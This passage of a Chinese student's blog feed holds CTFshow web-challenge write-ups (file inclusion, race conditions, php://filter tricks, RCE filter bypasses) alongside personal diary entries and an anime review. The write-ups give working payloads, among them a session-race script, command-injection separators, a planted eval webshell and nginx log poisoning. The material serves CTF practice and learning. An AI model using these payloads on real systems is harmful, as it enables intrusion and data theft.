punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre><h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>条件竞争同上</p><h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>添加了如下代码</p><p>system(“rm -rf &#x2F;tmp&#x2F;*”);</p><p>&#x2F;&#x2F; 在 rm -rf &#x2F;tmp&#x2F;* 执行之后立刻有新的请求创建了 sess_shell 文件 条件竞争依然有效</p><h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>添加了一个内容识别，如果有<code>&lt;</code>就die，依旧可以竞争。</p><h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。<br>include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。<br>脚本里用的是完整路径，不影响竞争。</p><h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET['file']))&#123;    $file = $_GET['file'];    $content = $_POST['content'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'大佬别秀了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);&#125;</code></pre><p>file_put_contents() 函数把一个字符串写入文件中。</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() 函数</a></p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ447wWhSwi2iD&alichlgref=https://xz.aliyun.com/t/8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p><p>参考大佬文章，可以使用base64或者rot13来进行对前面代码进行杂糅</p><p>首先构造$file，因为要对file进行一次url解码所以我们对payload进行两次url编码</p><p>晚上大多工具是对英文字符不进行url编码的，所以这里给出脚本方便进行urlencode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 指定字符集，转换为ASCII码后，再转换为16进制，并添加%</span>    special_chars <span class="token operator">=</span> <span class="token string">"!#$&amp;'()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>    <span class="token keyword">if</span> char <span class="token keyword">in</span> special_chars<span class="token punctuation">:</span>        <span class="token comment"># 转换为ASCII码，然后转换为16进制，并添加%</span>        <span class="token keyword">return</span> <span class="token string">'%&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 对其他字符进行URL编码</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 对字符串中的每个字符进行编码</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> input_string<span class="token punctuation">)</span>input_string <span class="token operator">=</span> <span class="token string">"Test"</span>encoded_string <span class="token operator">=</span> url_encode<span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded_string<span class="token punctuation">)</span></code></pre><blockquote><p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p><p>两次编码后得到</p><p>file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%38%25%37%33%25%36%31%25%36%34%25%32%65%25%37%30%25%36%38%25%37%30</p></blockquote><p>然后进行Post content</p><p>base64可以绕过die函数。因为base64编码范围是 <code>0 ～ 9,a ～ z,A ～ Z,+,/ ，</code>所以除了这些字符，其他字符都会被忽略掉。</p><p>base64过滤之后就只有(phpdie)6个字符了，base64要求把每三个8Bit的字节转换为四个6Bit的字节，所以这里也要凑够四个字节的倍数，避免base64解码出问题，这里加上两个字符即可。</p><blockquote><p>​                    <?php system("tac fl0g.php");?></p><p>content&#x3D;aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data:&#x2F;&#x2F;text&#x2F;plain;base64,poc 其实和79差不多 只是注意的是编码成base64的时候要去掉 ＝</p><h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>访问网页给了视频，formost分解出来有图片是网站源码</p><p><img src="web116.png" loading="lazy"></p><p>然后直接访问flag.php就行，说实话有点懵，因为过滤挺狠的</p><h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>参考文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器</a></p><p>这道题过滤了rot13，base64，string等一些过滤器的内容，那换其他过滤器不就完事了。</p><p>这里我们用<code>convert.iconv.*</code>这个过滤器。</p><p>payload：</p><blockquote><p>GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;a.php</p><p>从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p><p>POST: contents&#x3D;?&lt;hp pvela$(G_TE’[‘a)] ;&gt;?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byeSophomore</title>
      <link href="/2024/06/26/byeSophomore/"/>
      <url>/2024/06/26/byeSophomore/</url>
      
        <content type="html"><![CDATA[<p>端午回来的那天下午不小心骨折了，刚刚完成了课设，除了开学的缓考外，对我来说，大学生活已经悄然过半</p><p>说起来也挺碌碌无为的，但也不至于一事无成，只是觉得还不够。对于未来的规划，坦白说我只想老老实实上个班赚钱，大家都想赚得多，因为这样才有资格赎回属于自己的一点自由，但也挺迷茫，因为确实没想好具具体体的方向。</p><blockquote><p>空虚的勉励和油腻的鸡汤一样令我反胃，如果一个人能轻易地通过几句文字得到十足的动力，这个人恐怕也单纯无脑而易于受到利用；而远大深刻真正有效的激励，却是一段话无法表达、表达后也无所裨益的：写出来只是给别人看的表决心，又不能深化这一激励。这一类的文字，要么只是流于形式的敷衍，要么就是浅薄的表露。</p></blockquote><p>总之还得去做吧，空想倒也没什么用，我写这些东西不知道要给谁看，也不知道谁会看到，我表达能力一向很弱，总觉得是读的书太少，所以也没有想着自己写的这点东西能给别人带来什么，就想记录一下吧。</p><p>想了好多，还是算了</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可能真的要等好久了</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e522772ea704707720a4ef0bc557a013923c8e9594f20e1e414419ebbbe9f8c7">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448c893679f123443b4998bde3cf7fd4145b6cef62f81d7d93737020320b0e23541555e880fea8707bb86efc5eb301b980d68362000fba23912338cfbc222360f316c5b26a09297697f0b442300a185fc224540ed14d4f6b9b56c2c90f2ccf70875ec7d2f03aa2b1cc2c4d1f01772d14154ffa797f4247e153da0f8b87550482fc337a7e7b2701c4e7180282ec6fc05cb25c71bfe2b3ca63a95e6bfa153832774b1da60405909979bbdadaccd13874f3d3bbc1506612118e8111ac08adfb6f4944da15f0d93e3e18cf22f942eef8640a5e921f340c074d93efa9ce303824ea2c2173c750b03d0ca025bdde24e3287f71e083c4dc81abfd7fd51f91600d50ca94a76a778bb4fd5f71fd66cd3f639ff2e4a4331ff5fc177482301680bb501c3aa8b25b079ed9a63752ed5abf85e1fdf4ae54fc04acac0e54b928cc7eb39fc987a11bba9050655b470f3fb2a159deea5e1ca7d573acce7c7f4a5250bc3249e4487c73f7a8ed7067d3dd09e6871dd0d448ed358c388430538ad145d5cfaaa472a7b7553d73281fa7aad8037dfdeb00aa2f53b3bb83b1fdfdb7a99749d58f2ce97369c95ab5561e7406501a9463e9f74f293dae82484bf02cd92e0ca53a6e307bcd513d26069177efad396a4628d4eeeb9c642d5211abc1ac9cd63eb1c6b3e1aef02390bf3e1dbc531fd2d3850f5a6397759de2bf295fd9068a3b7afb5cd1ff3f910e80d6c5ab4812c64688e7c9694b721c7e5c1ab547a11eafbbb71b30899639877c2b10719dcdf3ac1f215ea733cebacab4f4d019c6efbc82d4e474c076d65fc3c063e055be71425c0dcab0d48e1da8cb659adecb2ec4489fc0aa71d71613ffd694955df279aca61fd267d4ae1be23e399c0dca1df15aa793a02997fbeb87cc019e1bab7b78ea55e14783ad10f9b9508eb44314c89aac04aac3ae7f06e7b0897c5b79ed5829c064fa10e5db82d616ab1e9d82e253dc99d0bb8b3f868a0ba6f583f46335a49923edaf0c629c2fd85e87425fa40e6ad7f72a5174bc640dded86cad62e17cf2f75dde1c4e1519a30da2dd7dafc129992eaf346da628941bfe2404dc1471fde14548edf1fa018774df7f99c8f9094b05c7767b77cbc019ab4ab4d195afa0a50b0bc5063c3b6343a157d63ab54e10d084c861e2015e47e68ffda2d10cc0b79298b8f4a7c4b9d046ec861a32246220f1b46489b762a85f1d7d1f6488424d89b80d43f312f2b84232b0bcaced24921db52222da9ece94827544c8dfecf8790186634a966ec60c48fb5e0b7ee49b1ec97e5780c9a1497a3264a912483377f3a6cff979a0cf358c6d807627f1b490a41819be1e5ebfd4945c7d494b7f68eac8f8aeeae61697c3aaad07326063dd7a84b9b35f3c1fe2599ecd6c4080e3cc6e456555c68b10069f9dc4aa73c204b18290c2d9a7f4b28ef9acfa4bca8fa735f76da9f02cacb54913fd480204f5f33c2b636008571647a7e5d1d1ed8631fce3e9a5709260cb0c829586b556c5d175a6d2a72e6351d8ff252febae745c979657e7d276bc23ff0ab34a5f22445af1127d283e71ca7b3a84761334dc1d408944f66dea2647ab335cb1bb70da8143ce73711d8c77d59a29b14d42be38386f94ea7e2ee82cbfc155fae65db97f537970539391d0da75435d3b28c0b4dc7fc2cd732ccc48b024d9b87c605de90e0b7ef38e55195100a547d826cfa7159597a823577ce716ef8919ac4297a312bcb0c073b3146c3d66952756fb43cb4b37614dd0545f2ae17319a33fc1cf3fd3574b7c1cc3f04f76d93ac7aa564e3e6be54d8eaf86b784a48cbcf4420fb24692206291e3ce9a6bfac560c6c87473d68d778f792e8ced1f58c30c9f4b5d0542736606ed396f509a5810a4d20be921ab88e3c3c244bbb52a48fa92b33bdd4d9e69bfc7a875e46c6afc3f9312997af870cc69b9d81e3b0ac691c1afbbbc6c920729ebdacbdc487caf18a1a247768909f0cad6074b695cd9bcd7c3cae0c5aea4fc39c15c119bb893afefdcc703c8add147c7eb886b3197fb570e2472d07302d14fb13ee4e834d07f689c1082925bbb3d3d22bda707719c939c364faf76794a2656322958e904460a9f0b43090dcfb60a6ae7e9555916b662aadda62fbb96e70a8a16436ae100788e1cca5e9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>Lucy带David第一次来月球</em></p><p>之前有很多朋友安利过，看到很多同学喜欢这个动漫，看完后不出意料的非常好看 </p><p>最打动我的当然是Lucy和David，David从第一次被Lucy带进月球，就一直记得Lucy最想去月球了，Lucy为了保护David一直在不顾危险的默默的付出，尽管最后并不是完美的结局，不过感动我的是他们存在于细枝末节的温柔。</p><p>当然，不止他们，还有很多令人难忘的角色和出色独特背景设定。</p><p>在大多数科技被顶层垄断的时候，每个人都生活在监控之下，他们是一群游离在社会底层和城市边缘的<em><strong>赛博朋克</strong></em>，他们的梦想可能是自由吧，不过渴求自由似乎太过奢望，不过他们以及很多伙伴都有着属于Cyberpunk的浪漫</p><p>动漫中的Bgm也同样好听：<em>I Really Want to Stay at Your House</em></p><p><strong>一些壁纸↓↓↓</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="David和Lucy🥰" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>David的麻麻😭</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>非常可爱的小女孩</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>大合照</em></p><p><strong>这个世界上没有任何人能完全信任，除了你自己。</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>对不起，我们不能一起上月球了。</strong></p><p><img src="11.png" loading="lazy"><em>David的遗言😭😭😭</em></p><p><strong>赛博朋克不都是在逃避某种可耻人生的逃难者，或是抱着遥远志向而迷失自我的逐梦者吗 ？</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>酷酷的kiwi</em></p><p><strong>回顾过去没有意义。</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-rce</title>
      <link href="/2024/06/03/web%E5%85%A5%E9%97%A8-rce/"/>
      <url>/2024/06/03/web%E5%85%A5%E9%97%A8-rce/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><h4 id="用于命令执行的常见姿势"><a href="#用于命令执行的常见姿势" class="headerlink" title="用于命令执行的常见姿势"></a>用于命令执行的常见姿势</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(文件包含漏洞，配合php伪协议)</p><h4 id="一些常见的绕过方式"><a href="#一些常见的绕过方式" class="headerlink" title="一些常见的绕过方式"></a>一些常见的绕过方式</h4><h5 id="Windows支持："><a href="#Windows支持：" class="headerlink" title="Windows支持："></a>Windows支持：</h5><p>|直接执行后面的语句 ping 127.0.0.1|whoami<br>||前面出错执行后面的 ，前面为假 ping 2||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%1a 作为.bat文件的命令分隔符</p><h5 id="Linux支持"><a href="#Linux支持" class="headerlink" title="Linux支持:"></a>Linux支持:</h5><p>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br>|管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>||当前面的执行出错时执行后面的 ping 1||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%0d 换行</p><h5 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h5><p>使用&lt;代替空格</p><p>使用${IFS}代替空格</p><blockquote><p>IFS变量的相关信息：</p><ul><li>Shell把变量IFS内的每一个字符都当做是一个分割符(delimeter)，用这些字符作为每一个字段的结束符来进行分割。</li><li>如果IFS没有设置，或者IFS的值被设置为”\t\n”(space, tab和 newline)，那么操作对象的开始和结束处的所有space, tab和newline序列都将被忽略，但是操作对象中间的space, tab和newline序列会作为界定符工作。</li><li>如果IFS值不是默认值(例如程序中对IFS进行设置过)，只有出现在IFS内的空白字符(可能是space, tab或newline中的一个或几个)才会在单词开始和结束处被忽略，这里说的是单词，而不是整个操作对象。</li><li>IFS内的非空白字符多个连续出现时，每个非空白字符会被当做单独的分隔符看待，但是多个连续的空白字符会被当做一个分隔符看待。</li><li>如果IFS为空(“null”)，则不会进行单词分割。</li></ul></blockquote><p>使用$IFS代替空格</p><h5 id="过滤斜杠-绕过"><a href="#过滤斜杠-绕过" class="headerlink" title="过滤斜杠&#x2F;绕过"></a>过滤斜杠&#x2F;绕过</h5><p>使用${HOME:0:1}代替</p><h5 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h5><p>PHP 伪协议是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p><table><thead><tr><th>伪协议</th><th>功能</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问 HTTP(s) 网址</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP 归档</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>压缩流</td></tr></tbody></table><p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre><p>稍微解释下这个做法，php:&#x2F;&#x2F;filter&#x2F; 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 php:&#x2F;&#x2F;input，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p><h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h5><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p><pre class="language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</code></pre><h5 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h5><p>1.tee 从标准输入读取，再写入标准输出和文件。</p><p>2.反弹shell</p><p>3.dnslog外带</p><h5 id="下划线的正则绕过"><a href="#下划线的正则绕过" class="headerlink" title="下划线的正则绕过"></a>下划线的正则绕过</h5><p> 这个正则的绕过方法就是利用特性来绕过，可以用</p><p>　[</p><p> (空格)</p><p> + 　</p><p> .</p><p>上面那几个字符任何一个都行，都可以被处理成_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>只是过滤了简单的flag字符，直接使用system函数</p><p>Payload:</p><blockquote><p>1、用egrep效果一样egrep&#x3D;grep  -E<br>c&#x3D;system(“cat fl<em>g.php | grep  -E ‘fl.g’ “);<br>2、此种方式需要右键源代码<br>c&#x3D;system(“cat fl</em>g.php”);<br>3、</p><p>c&#x3D;system(“tac fl<em>g.php”);<br>4、倒序输出文本<br>c&#x3D;system(“tac fl</em>ag.php”);<br>5、<br>c&#x3D;system(“cp fl*g.php a.txt “);<br>访问&#x2F;a.txt<br>6、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码<br>c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);<br>&#x2F;a.php?c&#x3D;system(“tac flag.php”);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>过滤了system函数，可以用反引号来命令执行</p><p>Payload:</p><blockquote><p>1、nl命令，带着行号输出文本内容<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>单引号：引号里面的内容会原封不动的显示出来（很简单，不做解释）<br>双引号：里面的特殊符号会被解析，变量也会被替换（\ 符号、空格会被解析）<br>echo \a -&gt; a<br>echo “\a” -&gt; \a<br>2、passthru函数，同system，同理exec，shell_exec也可以用，不过有点麻烦<br>c&#x3D;passthru(“cat fla*”);<br>c&#x3D;exec(passthru(“cat fla*”));<br>c&#x3D;shell_exec(passthru(“cat fla*”));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>题目过滤了空格，单引号，小数点，</p><p>过滤了空格，可以使用%09替代；也可以使用{$IFS}，因为单引号被过滤了，所以如果使用c&#x3D;passthru(“cat%09fla*”);或者{$IFS}都不会被解释为空格</p><p>所以构造如下Payload:</p><blockquote><p>1、使用eval嵌套。具体参数：passthru 结合%09，也可以直接rce，因为没有对其他参数进行过滤<br>其中%09绕过空格 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac%09fla*”); 这里需要注意括号的闭合，&amp;的连接。<br>2、使用参数：passthru结合 $IFS$9<br>其中$IFS$9绕过空格，注意转义$符号 ?<br>$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac$IFS$9fla*”);<br>3、使用未被过滤的命令。passthru直接读取<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); 也就是passthru(“tac$IFS$9fla*”);<br>4、使用pos(localeconv)来获取小数点<br>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c&#x3D;print_r(scandir(pos(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginx日志注入"><a href="#web32-nginx日志注入" class="headerlink" title="web32(nginx日志注入)"></a>web32(nginx日志注入)</h4><p>过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号</p><p>所以这里需要使用include来构造Payload:</p><blockquote><p>1、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>其中?&gt;代替分号，页面会显示flag.php内容的base64编码，解码即可获取flag<br>还有一种方法，日志注入<br>2、?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p><p>3、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>也可以使用php:&#x2F;&#x2F;input然后使用post执行命令<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>相比上一关只多过滤了“</p><p>所以web32Payload依旧适用</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>多过滤一个:  之前payload依旧适用</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>多过滤一个&#x3D; &lt;   之前payload依旧适用</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>多过滤了数字  GET参数改为a即可</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg <span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span>，<span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 